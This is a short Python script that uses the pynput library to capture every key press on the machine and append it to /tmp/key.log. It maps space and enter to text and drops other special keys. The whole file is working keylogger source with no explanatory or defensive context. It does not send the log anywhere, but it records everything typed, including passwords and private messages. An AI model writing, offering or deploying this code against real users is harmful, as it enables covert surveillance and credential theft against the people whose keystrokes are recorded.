from pynput.keyboard import Listener
import re

log_file = '/tmp/key.log'

def capture(keyboard_key):
    keyboard_key = str(keyboard_key)
    keyboard_key = re.sub(r'\'', '', keyboard_key)
    keyboard_key = re.sub(r'Key.space', ' ',keyboard_key)
    keyboard_key = re.sub(r'Key.enter', '\n', keyboard_key)
    keyboard_key = re.sub(r'Key.*', '', keyboard_key)

    with open(log_file, 'a') as log:
        log.write(keyboard_key)

with Listener(on_press=capture) as l:
    l.join()